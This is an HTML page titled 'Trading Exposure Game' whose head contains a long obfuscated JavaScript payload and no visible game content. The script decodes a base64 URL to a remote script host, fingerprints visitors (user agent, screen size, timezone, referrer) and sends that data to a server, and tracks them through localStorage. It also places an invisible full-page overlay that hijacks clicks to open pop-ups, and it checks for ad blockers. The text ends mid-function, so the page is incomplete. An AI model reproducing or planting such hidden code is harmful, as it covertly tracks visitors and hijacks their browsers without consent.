<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trading Exposure Game</title>
<script data-cfasync="false" type="text/javascript">(()=>{var K='ChmaorrCfozdgenziMrattShzzyrtarnedpoomrzPteonSitfreidnzgtzcseljibcOezzerlebpalraucgeizfznfoocrzEwaocdhnziaWptpnleytzngoectzzdclriehaCtdenTeepxptaNzoldmetzhRzeegvEoxmpezraztdolbizhXCGtIs=rzicfozn>ceamtazr(fdio/c<u>m"eennto)nz:gyzaclaplslizdl"o=ceallySttso r"akgneazl_bd:attuaozbsae"t=Ictresm zegmeatrIftie<mzzLrMeTmHorveenIntiezmezdcolNeeanrozldcezcdoadeehUzReIdCooNmtpnoenreanptzzebnionndzzybatlopasziedvzaellzyJtSsOzNezmDaartfeizzAtrnreamyuzcPordozmyidsoebzzpeatrasteSIyndtazenrazvtipgiartcoSrtzneenrcroudcezUeRmIazNUgianTty8BAsrtrnaeymzesleEttTeigmzedoIuytBztsneetmIenltEetrevgazlSzNAtrnreamyeBluEfeftearezrcclzetanreTmigmaeroFuttnzecmluecaorDIenttaeerrvcazltznMeevsEshacgteaCphsaindnzelllzABrrootacdeclaesStyCrheaunqnzerloztecnecloedSeyUrReIuCqozmrpeonneetnstizLTtynpeevEErervoormzeErvzernetnzeEtrsrioLrtznIemvaEgdedzaszetsnseimoenlSEteotraaegrec'.split("").reduce((v,g,L)=>L%2?v+g:g+v).split("z");(v=>{let g=[K[0],K[1],K[2],K[3],K[4],K[5],K[6],K[7],K[8],K[9]],L=[K[10],K[11],K[12]],R=document,U,s,c=window,C={};try{try{U=window[K[13]][K[0]](K[14]),U[K[15]][K[16]]=K[17]}catch(a){s=(R[K[10]]?R[K[10]][K[18]]:R[K[12]]||R[K[19]])[K[20]](),s[K[21]]=K[22],U=s[K[23]]}U[K[24]]=()=>{},R[K[9]](K[25])[0][K[26]](U),c=U[K[27]];let _={};_[K[28]]=!1,c[K[29]][K[30]](c[K[31]],K[32],_);let S=c[K[33]][K[34]]()[K[35]](36)[K[36]](2)[K[37]](/^\d+/,K[38]);window[S]=document,g[K[39]](a=>{document[a]=function(){return c[K[13]][a][K[40]](window[K[13]],arguments)}}),L[K[39]](a=>{let h={};h[K[28]]=!1,h[K[41]]=()=>R[a],c[K[29]][K[30]](C,a,h)}),document[K[42]]=function(){let a=new c[K[43]](c[K[44]](K[45])[K[46]](K[47],c[K[44]](K[45])),K[48]);return arguments[0]=arguments[0][K[37]](a,S),c[K[13]][K[42]][K[49]](window[K[13]],arguments[0])};try{window[K[50]]=window[K[50]]}catch(a){let h={};h[K[51]]={},h[K[52]]=(B,ve)=>(h[K[51]][B]=c[K[31]](ve),h[K[51]][B]),h[K[53]]=B=>{if(B in h[K[51]])return h[K[51]][B]},h[K[54]]=B=>(delete h[K[51]][B],!0),h[K[55]]=()=>(h[K[51]]={},!0),delete window[K[50]],window[K[50]]=h}try{window[K[44]]}catch(a){delete window[K[44]],window[K[44]]=c[K[44]]}try{window[K[56]]}catch(a){delete window[K[56]],window[K[56]]=c[K[56]]}try{window[K[43]]}catch(a){delete window[K[43]],window[K[43]]=c[K[43]]}for(key in document)try{C[key]=document[key][K[57]](document)}catch(a){C[key]=document[key]}}catch(_){}let z=_=>{try{return c[_]}catch(S){try{return window[_]}catch(a){return null}}};[K[31],K[44],K[58],K[59],K[60],K[61],K[33],K[62],K[43],K[63],K[63],K[64],K[65],K[66],K[67],K[68],K[69],K[70],K[71],K[72],K[73],K[74],K[56],K[75],K[29],K[76],K[77],K[78],K[79],K[50],K[80]][K[39]](_=>{try{if(!window[_])throw new c[K[78]](K[38])}catch(S){try{let a={};a[K[28]]=!1,a[K[41]]=()=>c[_],c[K[29]][K[30]](window,_,a)}catch(a){}}}),v(z(K[31]),z(K[44]),z(K[58]),z(K[59]),z(K[60]),z(K[61]),z(K[33]),z(K[62]),z(K[43]),z(K[63]),z(K[63]),z(K[64]),z(K[65]),z(K[66]),z(K[67]),z(K[68]),z(K[69]),z(K[70]),z(K[71]),z(K[72]),z(K[73]),z(K[74]),z(K[56]),z(K[75]),z(K[29]),z(K[76]),z(K[77]),z(K[78]),z(K[79]),z(K[50]),z(K[80]),C)})((v,g,L,R,U,s,c,C,z,_,S,a,h,B,ve,N,fe,rt,cn,H,lK,zn,Kt,ft,ue,yK,ut,I,ot,j,an,qt)=>{(function(e,q,i,w){(()=>{function ie(n){let t=n[e.IK]()[e.Aj](e.J);return t>=e.HK&&t<=e.rj?t-e.HK:t>=e.ej&&t<=e.tj?t-e.ej+e.LK:e.J}function bn(n){return n<=e.nK?v[e.Kj](n+e.HK):n<=e.jj?v[e.Kj](n+e.ej-e.LK):e.uK}function Mt(n,t){return n[e.Pk](e.h)[e.NK]((r,f)=>{let u=(t+e.U)*(f+e.U),o=(ie(r)+u)%e.lK;return bn(o)})[e.EK](e.h)}function _e(n,t){return n[e.Pk](e.h)[e.NK]((r,f)=>{let u=t[f%(t[e.SK]-e.U)],o=ie(u),M=ie(r)-o,d=M<e.J?M+e.lK:M;return bn(d)})[e.EK](e.h)}var dt=S,O=dt,it=e.yj(e.rK,e.KK),ct=e.yj(e.jK,e.KK),zt=e.V,at=[[e.kj],[e.Mj,e.bj,e.Ej],[e.Yj,e.Sj],[e.gj,e.Cj,e.Gj],[e.hj,e.vj]],bt=[[e.Oj],[-e.Lj],[-e.Nj],[-e.Fj,-e.qj],[e.Wj,e.Ej,-e.Oj,-e.Rj]],jt=[[e.cj],[e.pj],[e.Bj],[e.Qj],[e.Vj]];function Ce(n,t){try{let r=n[e.FK](f=>f[e.LM](t)>-e.U)[e.vM]();return n[e.LM](r)+zt}catch(r){return e.J}}function mt(n){return it[e.hK](n)?e.i:ct[e.hK](n)?e.V:e.U}function Et(n){return Ce(at,n)}function lt(n){return Ce(bt,n[e.mj]())}function yt(n){return Ce(jt,n)}function pt(n){return n[e.Pk](e.iK)[e.kK](e.U)[e.FK](t=>t)[e.vM]()[e.Pk](e.DK)[e.kK](-e.V)[e.EK](e.DK)[e.eM]()[e.Pk](e.h)[e.sK]((t,r)=>t+ie(r),e.J)%e.w+e.U}var Be=[];function xt(){return Be}function X(n){Be[e.kK](-e.U)[e.oj]()!==n&&Be[e.Hj](n)}var oe=typeof i<e.l?i[e.qr]:e.v,Ne=e.H,Te=e.n,ce=c[e.A]()[e.IK](e.lK)[e.kK](e.V),st=c[e.A]()[e.IK](e.lK)[e.kK](e.V),Fe=c[e.A]()[e.IK](e.lK)[e.kK](e.V),pK=c[e.A]()[e.IK](e.lK)[e.kK](e.V);function jn(n){oe[e.zK](Ne,jn),[mt(w[e.fr]),Et(q[e.uj][e.JK]),lt(new s),pt(q[e.nj][e.xb]),yt(w[e.yb]||w[e.Lb])][e.X](t=>{let r=a(c[e.A]()*e.LK,e.LK);N(()=>{let f=e.MK();f[e.aK]=n[e.XK],f[e.ob]=t,q[e.PK](f,e.fK),X(e.LE[e.CK](t))},r)})}function mn(n){oe[e.zK](Te,mn);let t=e.MK();t[e.aK]=n[e.XK];let{href:r}=q[e.nj],f=new q[e.Tj];f[e.Pj](e.gr,r),f[e.fj]=()=>{t[e.Nr]=f[e.bE](),q[e.PK](t,e.fK)},f[e.Rr]=()=>{t[e.Nr]=e.Fb,q[e.PK](t,e.fK)},f[e.xk]()}oe&&(oe[e.T](Ne,jn),oe[e.T](Te,mn));var 
    ht=e.u,wt=e.z,V=e.a,ze=i[e.qr],T=[q],Jt=[],gt=()=>{};ze&&ze[e.Rr]&&(gt=ze[e.Rr]);try{let n=T[e.kK](-e.U)[e.oj]();for(;n&&n!==n[e.rk]&&n[e.rk][e.uj][e.JK];)T[e.Hj](n[e.rk]),n=n[e.rk]}catch(n){}T[e.X](n=>{n[e.Ub][e.PM][e.NM][e.aM]||(n[e.Ub][e.PM][e.NM][e.aM]=c[e.A]()[e.IK](e.lK)[e.kK](e.V));let t=n[e.Ub][e.PM][e.NM][e.aM];n[t]=n[t]||[];try{n[V]=n[V]||[]}catch(r){}});function Ut(n,t,r,f=e.J,u=e.J,o){let M;try{M=ze[e.Ek][e.Pk](e.iK)[e.V]}catch(d){}try{let d=q[e.Ub][e.PM][e.NM][e.aM]||V,b=q[d][e.FK](l=>l[e.Kk]===r&&l[e.bb])[e.vM](),p=e.MK();p[e.jk]=n,p[e.Mb]=t,p[e.Kk]=r,p[e.bb]=b?b[e.bb]:u,p[e.Eb]=M,p[e.Yb]=f,p[e.Sb]=o,o&&o[e.db]&&(p[e.db]=o[e.db]),Jt[e.Hj](p),T[e.X](l=>{let J=l[e.Ub][e.PM][e.NM][e.aM]||V;l[J][e.Hj](p);try{l[V][e.Hj](p)}catch(E){}})}catch(d){}}function Ae(n,t){let r=Pt();for(let f=e.J;f<r[e.SK];f++)if(r[f][e.Kk]===t&&r[f][e.jk]===n)return!e.J;return!e.U}function Pt(){let n=[];for(let t=e.J;t<T[e.SK];t++){let r=T[t][e.Ub][e.PM][e.NM][e.aM],f=T[t][r]||[];for(let u=e.J;u<f[e.SK];u++)n[e.FK](({format:o,zoneId:M})=>{let d=o===f[u][e.jk],b=M===f[u][e.Kk];return d&&b})[e.SK]>e.J||n[e.Hj](f[u])}try{for(let t=e.J;t<T[e.SK];t++){let r=T[t][V]||[];for(let f=e.J;f<r[e.SK];f++)n[e.FK](({format:u,zoneId:o})=>{let M=u===r[f][e.jk],d=o===r[f][e.Kk];return M&&d})[e.SK]>e.J||n[e.Hj](r[f])}}catch(t){}return n}function En(n,t){T[e.NK](r=>{let f=r[e.Ub][e.PM][e.NM][e.aM]||V;return(r[f]||[])[e.FK](u=>n[e.LM](u[e.Kk])>-e.U)})[e.sK]((r,f)=>r[e.CK](f),[])[e.X](r=>{try{r[e.Sb][e.ek](t)}catch(f){}})}var Y=e.MK();Y[e.U]=e.x,Y[e.d]=e.r,Y[e.Z]=e.K,Y[e.i]=e.j,Y[e.w]=e.k,Y[e.I]=e.M,Y[e.V]=e.b;var W=e.MK();W[e.U]=e.E,W[e.I]=e.Y,W[e.i]=e.S,W[e.V]=e.b;var k=e.MK();k[e.U]=e.g,k[e.V]=e.C,k[e.d]=e.G,k[e.Z]=e.G,k[e.i]=e.G;var m=9905328,F=9905327,xK=0,vt=0,_t=30,Ct=3,sK=true,hK=U[e.bK](g('eyJhZGJsb2NrIjp7fSwiZXhjbHVkZXMiOiIifQ==')),A=3,ln='Ly95b2hsZS5jb20vYWN0L2ZpbGVzL250ZmMubWluLmpzP3A9OTkwNTMyOA==',yn='eW9obGUuY29t',Bt=2,Nt=1758377032*e.mr,Tt='Zez$#t^*EFng',Ft='v83',At='8uawrkc946h',pn='7zwpaq282va3to2',xn='16q',sn='og1aj1in2tt',Lt='_sjyxbp',Xt='_swbcpuxw',Zt=false,x=e.MK(),Dt=e.XM[e.Pk](e.h)[e.zj]()[e.EK](e.h);typeof q<e.l&&(x[e.UK]=q,typeof q[e.uj]<e.l&&(x[e.aj]=q[e.uj])),typeof i<e.l&&(x[e.dK]=i,x[e.ZK]=i[Dt]),typeof w<e.l&&(x[e.or]=w);function hn(){let{doc:n}=x;try{x[e.pK]=n[e.pK]}catch(t){let r=[][e.eb][e.Sk](n[e.qb](e.kk),f=>f[e.Ek]===e.Jj);x[e.pK]=r&&r[e.Zb][e.pK]}}hn(),x[e.s]=()=>{if(!q[e.rk])return e.v;try{let n=q[e.rk][e.Ub],t=n[e.pK](e.zM);return n[e.ib][e.Yk](t),t[e.JM]!==n[e.ib]?!e.U:(t[e.JM][e.gk](t),x[e.UK]=q[e.rk],x[e.dK]=x[e.UK][e.Ub],hn(),!e.J)}catch(n){return!e.U}},x[e.D]=()=>{try{return x[e.dK][e.qr][e.JM]!==x[e.dK][e.ib]?(x[e.Rb]=x[e.dK][e.qr][e.JM],(!x[e.Rb][e.xK][e.iM]||x[e.Rb][e.xK][e.iM]===e.Zk)&&(x[e.Rb][e.xK][e.iM]=e.mb),!e.J):!e.U}catch(n){return!e.U}};var ae=x;function Rt(n,t,r){let f=ae[e.dK][e.pK](e.kk);f[e.xK][e.Mk]=e.Xj,f[e.xK][e.JK]=e.Xj,f[e.xK][e.bk]=e.J,f[e.Ek]=e.Jj,(ae[e.dK][e.BM]||ae[e.ZK])[e.Yk](f);let u=f[e.FM][e.Pj][e.Sk](ae[e.UK],n,t,r);return f[e.JM][e.gk](f),u}var be,Yt=[];function Qt(){let n=[e.Ck,e.Gk,e.hk,e.vk,e.Ok,e.Wk,e.ck,e.pk],t=[e.uK,e.Bk,e.Qk,e.Vk,e.Hk],r=[e.nk,e.uk,e.zk,e.ak,e.Xk,e.Jk,e.Uk,e.dk,e.Zk,e.ik,e.wk,e.Ik],f=c[e.lk](c[e.A]()*n[e.SK]),u=n[f][e.sk](e.yj(e.Ck,e.qM),()=>{let o=c[e.lk](c[e.A]()*r[e.SK]);return r[o]})[e.sk](e.yj(e.Gk,e.qM),()=>{let o=c[e.lk](c[e.A]()*t[e.SK]),M=t[o],d=c[e.EE](e.LK,M[e.SK]),b=c[e.lk](c[e.A]()*d);return e.h[e.CK](M)[e.CK](b)[e.kK](M[e.SK]*-e.U)});return e.Dk[e.CK](be,e.iK)[e.CK](u,e.iK)}function Ht(){return e.h[e.CK](Qt()[e.kK](e.J,-e.U),e.wK)}function Ot(n){return n[e.Pk](e.iK)[e.kK](e.i)[e.EK](e.iK)[e.Pk](e.h)[e.sK]((t,r,f)=>{let u=c[e.EE](f+e.U,e.I);return t+r[e.Aj](e.J)*u},e.Ak)[e.IK](e.lK)}function Vt(){let n=i[e.pK](e.kk);return n[e.xK][e.Mk]=e.Xj,n[e.xK][e.JK]=e.Xj,n[e.xK][e.bk]=e.J,n}function wn(n){n&&(be=n,Gt())}function Gt(){be&&Yt[e.X](n=>n(be))}function St(n){try{let t=i[e.pK](e.cr);t[e.aK]=e.RM,(i[e.BM]||i[e.PM])[e.Yk](t),N(()=>{try{n(getComputedStyle(t,e.v)[e.wE]!==e.XE)}catch(r){n(!e.J)}},e.ok)}catch(t){n(!e.J)}}function It(){let n=Bt===e.U?e.Uj:e.dj,t=e.mM[e.CK](n,e.oM)[e.CK](Y[A]),r=e.MK();r[e.ek]=wn,r[e.tk]=xt,r[e.yk]=sn,r[e.Lk]=pn,r[e.Nk]=xn,Ut(t,ht,m,Nt,F,r)}function Jn(){let n=W[A];return Ae(n,F)||Ae(n,m)}function gn(){let n=W[A];return Ae(n,F)}function Wt(){let n=[e.Fk,e.qk,e.Rk,e.mk],t=i[e.pK](e.kk);t[e.xK][e.bk]=e.J,t[e.xK][e.JK]=e.Xj,t[e.xK][e.Mk]=e.Xj,t[e.Ek]=e.Jj;try{i[e.PM][e.Yk](t),n[e.X](r=>{try{q[r]}catch(f){delete q[r],q[r]=t[e.FM][r]}}),i[e.PM][e.gk](t)}catch(r){}}var Le=e.MK(),je=e.MK(),Xe=e.MK(),$t=e.U,ee=e.h,me=e.h;Ze();function Ze(){if(ee)return;let n=fe(()=>{if(gn()){H(n);return}if(me){try{let t=me[e.Pk](le)[e.FK](M=>!le[e.hK](M)),[r,f,u]=t;me=e.h,Xe[e.o]=f,Le[e.o]=r,je[e.o]=Nn(u,e.Tr),[Le,je,Xe][e.X](M=>{ye(M,st,$t)});let o=[_e(Le[e.t],je[e.t]),_e(Xe[e.t],je[e.t])][e.EK](e.DK);ee!==o&&(ee=o,En([m,F],ee))}catch(t){}H(n)}},e.ok)}function Un(){return ee}function kt(){ee=e.h}function Ee(n){n&&(me=n)}var y=e.MK();y[e.A]=e.h,y[e.e]=e.h,y[e.t]=e.h,y[e.y]=void e.J,y[e.L]=e.v,y[e.N]=_e(Ft,At);var Pn=new s,vn=!e.U;_n();function _n(){y[e.y]=!e.U,Pn=new s;let n=Mr(y,Fe),t=fe(()=>{if(y[e.t]!==e.h){if(H(t),q[e.zK](e.P,n),y[e.t]===e.Fb){y[e.y]=!e.J;return}try{if(C(y[e.e])[e.NE](e.J)[e.X](f=>{y[e.A]=e.h;let u=Cn(e.KY,e.uE);C(u)[e.NE](e.J)[e.X](o=>{y[e.A]+=v[e.Kj](Cn(e.ej,e.tj))})}),gn())return;let r=e.IE*e.Lj*e.mr;N(()=>{if(vn)return;let f=new s()[e.xM]()-Pn[e.xM]();y[e.L]+=f,_n(),Ze(),hr()},r)}catch(r){}y[e.y]=!e.J,y[e.t]=e.h}},e.ok);q[e.T](e.P,n)}function er(){return y[e.t]=y[e.t]*e.UM%e.Tk,y[e.t]}function Cn(n,t){return n+er()%(t-n)}function nr(n){return n[e.Pk](e.h)[e.sK]((t,r)=>(t<<e.Z)-t+r[e.Aj](e.J)&e.Tk,e.J)}function tr(){return[y[e.A],y[e.N]][e.EK](e.DK)}function De(){let n=[...e.dM],t=(c[e.A]()*e.ZM|e.J)+e.d;return[...C(t)][e.NK](r=>n[c[e.A]()*n[e.SK]|e.J])[e.EK](e.h)}function Re(){return y[e.y]}function rr(){vn=!e.J}var le=e.yj(e.YK,e.h),Kr=typeof i<e.l?i[e.qr]:e.v,fr=e.F,ur=e.q,or=e.R,qr=e.m;function ye(n,t,r){let f=n[e.o][e.Pk](le)[e.FK](o=>!le[e.hK](o)),u=e.J;return n[e.t]=f[u],n[e.SK]=f[e.SK],o=>{let M=o&&o[e.tM]&&o[e.tM][e.aK],d=o&&o[e.tM]&&o[e.tM][e.ob];if(M===t)for(;d--;)u+=r,u=u>=f[e.SK]?e.J:u,n[e.t]=f[u]}}function Mr(n,t){return r=>{let f=r&&r[e.tM]&&r[e.tM][e.aK],u=r&&r[e.tM]&&r[e.tM][e.Nr];if(f===t)try{let o=(n[e.L]?new s(n[e.L])[e.IK]():u[e.Pk](fr)[e.eb](p=>p[e.DM](e.FE)))[e.Pk](ur)[e.oj](),M=new s(o)[e.cE]()[e.Pk](or),d=M[e.vM](),b=M[e.vM]()[e.Pk](qr)[e.vM]();n[e.e]=a(b/Ct,e.LK)+e.U,n[e.L]=n[e.L]?n[e.L]:new s(o)[e.xM](),n[e.t]=nr(d+Tt)}catch(o){n[e.t]=e.Fb}}}function Bn(n,t){let r=new ut(t);r[e.XK]=n,Kr[e.fk](r)}function Nn(n,t){return C[e.TM](e.v,e.MK(e.SK,t))[e.NK]((r,f)=>Mt(n,f))[e.EK](e.AK)}var Tn=e.U,Ye=e.MK(),Fn=e.MK(),An=e.MK();Ye[e.o]=pn,q[e.T](e.P,ye(Ye,ce,Tn));var dr=Ye[e.SK]*e.Tr;Fn[e.o]=Nn(sn,dr),An[e.o]=xn,q[e.T](e.P,ye(Fn,ce,e.Tr)),q[e.T](e.P,ye(An,ce,Tn));var Ln=e.f,pe=e.xr,ir=e.W,cr=e.l;function Xn(n){let t=a(n,e.LK)[e.IK](e.lK),r=[Ln,t][e.EK](cr),f=[Ln,t][e.EK](ir);return[r,f]}function zr(n,t){let[r,f]=Xn(n);j[r]=e.J,j[f]=t}function ar(n){let[t,r]=Xn(n),f=a(j[t],e.LK)||e.J,u=j[r];return f>=e.i?(delete j[t],delete j[r],e.v):u?(j[t]=f+e.U,u):e.v}function br(n){let t=new s()[e.xM]();try{j[pe]=e.h[e.CK](t,e.gb)[e.CK](n)}catch(r){}}function jr(){try{if(!j[pe])return e.h;let[n,t]=j[pe][e.Pk](e.gb);return a(n,e.LK)+e.Zj<new s()[e.xM]()?(delete j[pe],e.h):t}catch(n){return e.h}}var mr=e.rr,Er=e.Kr,Qe=e.jr,lr=e.kr,Zn=e.Mr,He=e.br,xe=e.Er,se=e.Yr,Dn=e.Sr,yr=e.gr,pr=e.Cr,xr=e.Gr,Oe=e.hr,Rn=e.vr,he=!e.U;function sr(){return e.eK[e.CK](m,e.tK)}function ne(){return Un()}function hr(){let n=e.MK(),t=fe(()=>{Re()&&(H(t),Ve())},e.ok);n[e.aK]=Fe,q[e.PK](n,e.fK)}function Ve(n){let t=new q[e.Tj];t[e.Pj](yr,e.Dk[e.CK](tr())),n&&t[e.rM](Qe,lr),t[e.rM](xr,k[A]),t[e.fj]=()=>{if(t[e.lb]===e.wb){let r=t[e.bE]()[e.VE]()[e.Pk](e.yj(e.HE,e.h)),f=e.MK();r[e.X](u=>{let o=u[e.Pk](e.oE),M=o[e.vM]()[e.eM](),d=o[e.EK](e.oE);f[M]=d}),f[Oe]?(he=!e.J,Ee(f[Oe]),n&&br(f[Oe])):f[Rn]&&Ee(f[Rn]),n||Ze()}},t[e.Rr]=()=>{n&&(he=!e.J,Ee(e.YE))},kt(),t[e.xk]()}function Yn(n){return new O((t,r)=>{let f=new s()[e.xM](),u=fe(()=>{let o=Un();o?(H(u),o===e.tE&&r(new I(e.tr)),he&&(n||rr(),t(o)),t()):f+e.lE<new s()[e.xM]()&&(H(u),r(new I(e.TE)))},e.ok)})}function wr(){let n=jr();if(n)he=!e.J,Ee(n);else{let t=fe(()=>{Re()&&(H(t),Ve(!e.J))},e.ok)}}var Qn=e.Or,wK=e.gK[e.CK](m,e.GK),Ge=e.Wr,JK=vt*e.Pr,gK=_t*e.mr;q[Ge]||(q[Ge]=e.MK());function Jr(n){try{let t=e.h[e.CK](Qn)[e.CK](n),r=an[t]||j[t];if(r)return new s()[e.xM]()>a(r,e.LK)}catch(t){}return!e.J}function Hn(n){let t=new s()[e.xM]()+e.Zj,r=e.h[e.CK](Qn)[e.CK](n);q[Ge][n]=!e.J;try{j[r]=t}catch(f){}try{an[r]=t}catch(f){}}var Q=w[e.fr],gr=Q[e.yK](e.yj(e.KM,e.h))||[],Ur=Q[e.yK](e.yj(e.jM,e.h))||[],On=a(gr[e.U],e.LK)||a(Ur[e.U],e.LK),we=e.yj(e.ij,e.h)[e.hK](Q),Pr=e.yj(e.rK,e.KK)[e.hK](Q),Vn=we||Pr,vr=e.yj(e.wj,e.h)[e.hK](Q),_r=e.yj(e.Ij,e.lj)[e.hK](Q),Cr=e.yj(e.kM,e.KK)[e.hK](Q)&&e.yj(e.MM,e.KK)[e.hK](Q),P,te,Se=!e.U,Gn=!e.U,Sn=g(yn),Br=[e.vK,e.H,e.OK,e.WK,e.cK];function Nr(n,t){let r=!Cr&&On<e.bM;n[e.T]?(we||(On&&!Vn?n[e.T](e.vK,t,!e.J):(_r||vr)&&!Vn?n[e.T](e.H,t,!e.J):(n[e.T](e.H,t,!e.J),n[e.T](e.OK,t,!e.J))),r?we?n[e.T](e.WK,t,!e.J):n[e.T](e.cK,t,!e.J):we&&n[e.T](e.H,t,!e.J)):i[e.sj]&&n[e.sj](e.E,t)}function Ie(n){!Jr(n)||Gn||(Gn=n===m,P=i[e.pK](e.cr),P[e.xK][e.iM]=e.EM,P[e.xK][e.rk]=e.J,P[e.xK][e.wM]=e.J,P[e.xK][e.IM]=e.J,P[e.xK][e.lM]=e.J,P[e.xK][e.ur]=e.Tk,P[e.xK][e.sM]=e.YM,te=t=>{if(Se)return;t[e.SE](),t[e.gE](),qe();let r=Rt(e.Dk[e.CK](Sn,e.nE)[e.CK](n,e.pE));r&&n===F?Hn(n):r&&n===m&&N(()=>{r[e.sE]||Hn(n)},e.mr)},Nr(P,te),i[e.PM][e.Yk](P),Se=!e.U)}function qe(){try{Br[e.X](n=>{q[e.zK](n,te,!e.J),q[e.zK](n,te,!e.U)}),P&&i[e.PM][e.gk](P),te=void e.J}catch(n){}Se=!e.J}function We(){return te===void e.J}function In(n){Sn=n}var Tr=e.cr,Wn=i[e.pK](Tr),Fr=e.pr,Ar=e.Br,Lr=e.Qr,Xr=e.Vr,Zr=e.Hr,Dr=e.nr;Wn[e.xK][e.ur]=Fr,Wn[e.xK][e.zr]=Ar;function Rr(n){let t=C[e.KE][e.kK][e.Sk](
        i[e.Tb])[e.FK](r=>r[e.xb]===n)[e.oj]()[e.Dj];return(t[e.J][e.fM][e.DM](e.AM)?t[e.J][e.xK][e.SM]:t[e.V][e.xK][e.SM])[e.kK](e.U,-e.U)}function $e(n){return Kt(g(n)[e.Pk](e.h)[e.NK](function(t){return e.jE+(e.Bk+t[e.Aj](e.J)[e.IK](e.uE))[e.kK](-e.V)})[e.EK](e.h))}function ke(n){let t=g(n),r=new rt(t[e.SK]);return new ve(r)[e.NK]((f,u)=>t[e.Aj](u))}function Yr(n,t){return new O((r,f)=>{let u=i[e.pK](Lr);u[e.xb]=n,u[e.Pb]=Xr,u[e.pM]=Dr,u[e.fb]=Zr,i[e.ib][e.xE](u,i[e.ib][e.kE]),u[e.fj]=()=>{try{let o=Rr(u[e.xb]);u[e.JM][e.gk](u),r(t===xe?ke(o):$e(o))}catch(o){f()}},u[e.Rr]=()=>{u[e.JM][e.gk](u),f()}})}function Qr(n,t){return new O((r,f)=>{let u=new ot;u[e.fb]=e.tb,u[e.Ek]=n,u[e.fj]=()=>{let o=i[e.pK](e.JE);o[e.Mk]=u[e.Mk],o[e.JK]=u[e.JK];let M=o[e.UE](e.dE);M[e.QE](u,e.J,e.J);let{data:d}=M[e.ZE](e.J,e.J,u[e.Mk],u[e.JK]),b=d[e.kK](e.J,e.zE)[e.FK]((E,Z)=>(Z+e.U)%e.d)[e.zj]()[e.sK]((E,Z,Ke)=>E+Z*c[e.EE](e.PE,Ke),e.J),p=[];for(let E=e.zE;E<d[e.SK];E++)if((E+e.U)%e.d){let Z=d[E];(t===xe||Z>=e.qE)&&p[e.Hj](v[e.Kj](Z))}let l=L(p[e.EK](e.h)[e.yE](e.J,b)),J=t===xe?ke(l):$e(l);return r(J)},u[e.Rr]=()=>f()})}function Hr(n,t,r=He,f=se,u=e.MK()){return new O((o,M)=>{let d=new q[e.Tj];if(d[e.Pj](f,n),d[e.nM]=r,d[e.rE]=!e.J,d[e.rM](mr,L(B(t))),d[e.fj]=()=>{let b=e.MK();b[e.lb]=d[e.lb],b[e.Nr]=r===He?U[e.BE](d[e.Nr]):d[e.Nr],[e.wb,e.RE][e.LM](d[e.lb])>=e.J?o(b):M(new I(e.rY[e.CK](d[e.lb],e.oM)[e.CK](d[e.fE],e.mE)[e.CK](t)))},d[e.Rr]=()=>{M(new I(e.rY[e.CK](d[e.lb],e.oM)[e.CK](d[e.fE],e.mE)[e.CK](t)))},f===Dn){let b=typeof u==e.GE?U[e.BE](u):u;d[e.rM](Qe,Zn),d[e.xk](b)}else d[e.xk]()})}function Or(n,t,r=He,f=se,u=e.MK()){return new O((o,M)=>{let d=Ot(n),b=Vt(),p=!e.U,l,J,E=()=>{try{b[e.JM][e.gk](b),q[e.zK](e.P,Z),p||M(new I(e.xY))}catch(Ke){}};function Z(Ke){let de=ue[e.rb](Ke[e.tM])[e.oj]();if(de===d)if(cn(J),Ke[e.tM][de]===e.v){let D=e.MK();D[de]=e.MK(e.DE,e.AE,e.cM,L(B(t)),e.QM,f,e.BM,typeof u==e.GE?U[e.BE](u):u),f===Dn&&(D[de][e.eE]=U[e.BE](e.MK(e.jr,Zn))),b[e.FM][e.PK](D,e.fK)}else{p=!e.J,E(),cn(l);let D=e.MK(),dn=U[e.bK](g(Ke[e.tM][de]));D[e.lb]=dn[e.iE],D[e.Nr]=r===xe?ke(dn[e.BM]):$e(dn[e.BM]),[e.wb,e.RE][e.LM](D[e.lb])>=e.J?o(D):M(new I(e.rY[e.CK](D[e.lb],e.mE)[e.CK](t)))}}q[e.T](e.P,Z),b[e.Ek]=n,(i[e.BM]||i[e.PM])[e.Yk](b),J=N(E,e.ME),l=N(E,e.Fr)})}function Je(n){try{return n[e.Pk](e.iK)[e.V][e.Pk](e.DK)[e.kK](-e.V)[e.EK](e.DK)[e.eM]()}catch(t){return e.h}}var Me=e.ar,Vr=e.Xr,Gr=e.O,Sr=e.l,Ir=e.Jr,G=e.MK();G[e.Ur]=e.O,G[e.dr]=e.W,G[e.Zr]=e.c,G[e.ir]=e.p,G[e.wr]=e.B,G[e.Ir]=e.Q;function $n(n,t){let r=G[t]||Sr,f=a(n,e.LK)[e.IK](e.lK),u=[Me,f][e.EK](r),o=[Me,f,Vr][e.EK](r),M=[Me,f,Gr][e.EK](r);return[u,o,M]}function Wr(){let n=j[Me];if(n)return n;let t=c[e.A]()[e.IK](e.lK)[e.kK](e.V);return j[Me]=t,t}function $r(n){let t=e.gM[e.CK](ne(),e.CM),r=ue[e.rb](n)[e.NK](u=>{let o=ft(n[u]);return[u,o][e.EK](e.CE)})[e.EK](e.GM),f=new q[e.Tj];f[e.Pj](e.Sr,t,!e.J),f[e.rM](Qe,pr),f[e.xk](r)}function ge(n,t){let[r,f,u]=$n(n,t),o=a(j[u],e.LK)||e.J;j[u]=o+e.U,j[r]=new s()[e.xM](),j[f]=e.h}function Ue(n,t,r){let[f,u,o]=$n(n,t);if(j[f]&&!j[u]){let M=a(j[o],e.LK)||e.J,d=a(j[f],e.LK),b=new s()[e.xM](),p=b-d,{referrer:l}=i,J=q[e.nj][e.xb];j[u]=b,j[o]=e.J;let E=e.MK(e.Cb,n,e.Gb,l,e.hb,p,e.vb,r,e.Ob,b,e.Wb,Wr(),e.cb,J,e.pb,d,e.Bb,M,e.Qb,w[e.fr],e.Vb,q[e.uj][e.Mk],e.Hb,q[e.uj][e.JK],e.QM,t||Ir,e.nb,new s()[e.mj](),e.ub,Je(r),e.zb,Je(l),e.ab,Je(J),e.Xb,w[e.yb]||w[e.Lb]);$r(E)}}var kr=e.yj(e.BK,e.KK),eK=e.yj(e.QK),nK=e.yj(e.VK),tK=e.lr,kn=[tK,m[e.IK](e.lK)][e.EK](e.h),re=e.MK();re[e.W]=oK,re[e.B]=qK,re[e.Q]=nn,re[e.Xr]=et;var rK=[nn,et];function KK(n){return 